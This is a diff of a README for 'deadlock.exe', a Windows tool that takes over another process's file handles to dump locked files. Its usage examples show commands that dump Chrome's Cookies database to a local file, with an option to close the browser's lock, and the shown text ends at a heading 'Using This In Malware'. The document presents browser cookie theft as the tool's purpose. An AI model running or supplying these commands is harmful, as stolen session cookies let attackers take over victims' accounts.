@@ -9,13 +9,18 @@ Deadlock enumerates all instances of a process, Enumerates the private handle ta
 
 ## Usage
 ```
-$ deadlock.exe <TARGET_PROCESS> <LOCKED_FILE_TAG> <OUTPUT_FILE (Optional)>
+$ deadlock.exe <TARGET_PROCESS> <LOCKED_FILE_TAG> <OUTPUT_FILE> <CLOSE_REMOTE?>
 ```
 
-Example (Unlocking & Dumping Chrome cookies):
-
+## Examples
+Dumping Chrome cookies:
 ```
-deadlock.exe chrome.exe Network\Cookies ./ChromeCookies.dmp
+deadlock.exe chrome.exe Cookies ./cookies.dmp 0
+```
+
+Dumping Chrome cookies & removeing the file lock:
+```
+deadlock.exe chrome.exe Cookies ./cookies.dmp 1
 ```
 
 ## Using This In Malware
